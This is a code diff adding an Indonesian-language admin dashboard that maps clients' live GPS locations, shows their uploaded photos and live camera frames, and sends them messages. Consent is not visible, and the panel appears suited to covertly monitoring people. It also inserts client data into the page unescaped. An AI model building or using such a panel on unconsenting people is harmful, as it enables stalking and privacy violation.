@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="utf-8" />
+  <title>Admin Dashboard 💖</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
+  <style>
+    body {
+      margin: 0;
+      font-family: "Poppins", sans-serif;
+      display: flex;
+      height: 100vh;
+      background: linear-gradient(135deg, #ffe1eb, #ffc1dc);
+      color: #333;
+    }
+    #left {
+      width: 380px;
+      background: rgba(255, 255, 255, 0.35);
+      backdrop-filter: blur(10px);
+      border-right: 2px solid rgba(255, 255, 255, 0.4);
+      padding: 16px;
+      overflow-y: auto;
+      box-shadow: 4px 0 12px rgba(255, 100, 150, 0.2);
+    }
+    h3, h4 {
+      text-align: center;
+      margin: 8px 0;
+      color: #e91e63;
+    }
+    .client {
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+      padding: 10px;
+      border-radius: 10px;
+      background: rgba(255, 255, 255, 0.7);
+      margin-bottom: 12px;
+      box-shadow: 0 3px 8px rgba(255, 120, 160, 0.2);
+      transition: all 0.3s;
+    }
+    .client:hover {
+      transform: scale(1.02);
+      background: rgba(255, 255, 255, 0.9);
+    }
+    .client-header {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .client img {
+      width: 60px;
+      height: 60px;
+      border-radius: 10px;
+      object-fit: cover;
+      border: 2px solid #ff69b4;
+    }
+    .meta {
+      flex: 1;
+      font-size: 13px;
+      color: #444;
+    }
+    .client-actions {
+      display: flex;
+      justify-content: space-between;
+      gap: 6px;
+      margin-top: 6px;
+    }
+    .btn {
+      flex: 1;
+      padding: 6px 10px;
+      border: none;
+      border-radius: 6px;
+      background: linear-gradient(90deg, #ff4081, #ff80ab);
+      color: #fff;
+      cursor: pointer;
+      font-size: 12px;
+      transition: all 0.3s;
+    }
+    .btn:hover {
+      transform: scale(1.05);
+      box-shadow: 0 0 10px rgba(255, 64, 129, 0.4);
+    }
+    #streamBox {
+      background: rgba(255, 255, 255, 0.7);
+      border-radius: 12px;
+      padding: 10px;
+      margin-top: 14px;
+      text-align: center;
+      box-shadow: 0 3px 8px rgba(255, 100, 150, 0.2);
+    }
+    #streamFrame {
+      width: 100%;
+      border-radius: 10px;
+      max-height: 420px;
+      background: #000;
+      object-fit: contain;
+    }
+    input, textarea {
+      width: 100%;
+      padding: 8px;
+      border-radius: 6px;
+      border: 1px solid #ddd;
+      font-family: inherit;
+      box-sizing: border-box;
+    }
+    textarea {
+      margin-top: 6px;
+      resize: none;
+    }
+    #sendNotif {
+      width: 100%;
+      margin-top: 6px;
+    }
+    #map {
+      flex: 1;
+      height: 100%;
+    }
+    .leaflet-container {
+      background: #ffeef6;
+    }
+  </style>
+</head>
+<body>
+  <div id="left">
+    <h3>💞 Admin Dashboard 💞</h3>
+    <div id="clientsList">Memuat...</div>
+
+    <h4>Kirim Pesan ke Client</h4>
+    <input id="notifClientId" placeholder="client_id">
+    <textarea id="notifMsg" placeholder="Tulis pesan sayang..."></textarea>
+    <button id="sendNotif" class="btn">Kirim Pesan 💌</button>
+
+    <div id="streamBox">
+      <h4>Live Kamera</h4>
+      <img id="streamFrame" src="" alt="stream frame">
+    </div>
+  </div>
+
+  <div id="map"></div>
+
+  <script src="https://cdn.socket.io/4.6.1/socket.io.min.js"></script>
+  <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
+  <script>
+    const socket = io();
+    socket.emit("register", { role: "admin" });
+
+    const map = L.map('map').setView([0, 0], 2);
+    L.tileLayer('https://{s}.tile.openstreetmap.fr/hot/{z}/{x}/{y}.png', {
+      attribution: '&copy; <a href="https://www.openstreetmap.org/">OSM</a> 💖'
+    }).addTo(map);
+
+    const clients = {};
+    const markers = {};
+    let adminMarker = null;
+
+    // === Fungsi bantu ===
+    async function getIpLocation() {
+      try {
+        const res = await fetch("https://ipapi.co/json/");
+        const j = await res.json();
+        return { lat: j.latitude, lon: j.longitude, source: "ip" };
+      } catch {
+        return null;
+      }
+    }
+
+    function updateAdminMarker(lat, lon) {
+      const pos = [lat, lon];
+      if (!adminMarker) {
+        adminMarker = L.marker(pos, {
+          icon: L.divIcon({
+            html: '💞',
+            className: 'adminMarker',
+            iconSize: [28, 28],
+            iconAnchor: [14, 14]
+          })
+        }).addTo(map).bindPopup('<b>Admin (kamu)</b>');
+        map.setView(pos, 14);
+      } else {
+        adminMarker.setLatLng(pos);
+      }
+    }
+
+    function sendAdminLocation(lat, lon) {
+      socket.emit("location_update", {
+        client_id: "admin",
+        latitude: lat,
+        longitude: lon,
+        last_seen: Date.now()
+      });
+    }
+
+    // === Mulai tracking lokasi admin ===
+    async function startTrackingAdmin() {
+      if ("geolocation" in navigator) {
+        navigator.geolocation.watchPosition(
+          pos => {
+            const { latitude, longitude, accuracy } = pos.coords;
+            updateAdminMarker(latitude, longitude);
+            sendAdminLocation(latitude, longitude);
+            console.log(`📍 GPS: ${latitude}, ${longitude} (akurasi ±${Math.round(accuracy)}m)`);
+          },
+          async err => {
+            console.warn("GPS gagal:", err.message);
+            const ipLoc = await getIpLocation();
+            if (ipLoc) {
+              updateAdminMarker(ipLoc.lat, ipLoc.lon);
+              sendAdminLocation(ipLoc.lat, ipLoc.lon);
+              console.log("📍 Fallback ke lokasi IP");
+            } else {
+              alert("Tidak bisa mendapatkan lokasi admin 😿");
+            }
+          },
+          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        );
+      } else {
+        const ipLoc = await getIpLocation();
+        if (ipLoc) {
+          updateAdminMarker(ipLoc.lat, ipLoc.lon);
+          sendAdminLocation(ipLoc.lat, ipLoc.lon);
+        } else {
+          alert("Browser tidak mendukung lokasi 😢");
+        }
+      }
+    }
+
+    // === Render daftar client ===
+    function renderClients() {
+      const el = document.getElementById("clientsList");
+      el.innerHTML = "";
+      const keys = Object.keys(clients);
+      if (keys.length === 0) {
+        el.textContent = "(Belum ada klien aktif 💤)";
+        return;
+      }
+      keys.forEach(id => {
+        const c = clients[id];
+        const div = document.createElement("div");
+        div.className = "client";
+        div.innerHTML = `
+          <div class="client-header">
+            <img src="${c.last_image ? `/uploads/${c.last_image}` : '/static/img/kucing.jpeg'}" alt="client">
+            <div class="meta">
+              <b>${id}</b><br>
+              Terakhir aktif: ${c.last_seen ? new Date(c.last_seen).toLocaleString() : "—"}
+            </div>
+          </div>
+          <div class="client-actions">
+            <button class="btn" onclick="window.open('https://www.google.com/maps?q=${c.lat},${c.lon}', '_blank')">Lihat di Google Maps 🌍</button>
+          </div>
+        `;
+        el.appendChild(div);
+      });
+    }
+
+    // === Ambil data client awal ===
+    fetch("/clients")
+      .then(r => r.json())
+      .then(js => {
+        Object.assign(clients, js);
+        for (const id in clients) {
+          const c = clients[id];
+          if (c.lat && c.lon) {
+            const pos = [c.lat, c.lon];
+            markers[id] = L.marker(pos, {
+              title: id,
+              icon: L.divIcon({
+                html: "💗",
+                className: "customMarker",
+                iconSize: [24, 24],
+                iconAnchor: [12, 12]
+              })
+            }).addTo(map).bindPopup(`<b>${id}</b>`);
+          }
+        }
+        renderClients();
+      });
+
+    // === Lokasi client realtime ===
+    socket.on("location_update", data => {
+      const id = data.client_id;
+      const lat = parseFloat(data.latitude);
+      const lon = parseFloat(data.longitude);
+      if (isNaN(lat) || isNaN(lon)) return;
+      if (!clients[id]) clients[id] = {};
+      clients[id].lat = lat;
+      clients[id].lon = lon;
+      clients[id].last_seen = data.last_seen;
+      if (!markers[id]) {
+        markers[id] = L.marker([lat, lon], {
+          title: id,
+          icon: L.divIcon({
+            html: "💗",
+            className: "customMarker",
+            iconSize: [24, 24],
+            iconAnchor: [12, 12]
+          })
+        }).addTo(map).bindPopup(`<b>${id}</b>`);
+      } else {
+        markers[id].setLatLng([lat, lon]);
+      }
+      renderClients();
+    });
+
+    // === Stream kamera client ===
+    socket.on("stream_frame", data => {
+      document.getElementById("streamFrame").src = data.image;
+    });
+
+    // === Kirim pesan ke client ===
+    document.getElementById("sendNotif").addEventListener("click", () => {
+      const clientId = document.getElementById("notifClientId").value.trim();
+      const message = document.getElementById("notifMsg").value.trim();
+      if (!clientId || !message) return alert("Isi client_id dan pesan!");
+      socket.emit("admin_send_notification", { client_id: clientId, message });
+    });
+
+    socket.on("notification_sent", data => {
+      alert("Pesan dikirim ke " + data.client_id + " 💌");
+    });
+
+    // Jalankan tracking admin
+    startTrackingAdmin();
+  </script>
+</body>
+</html>
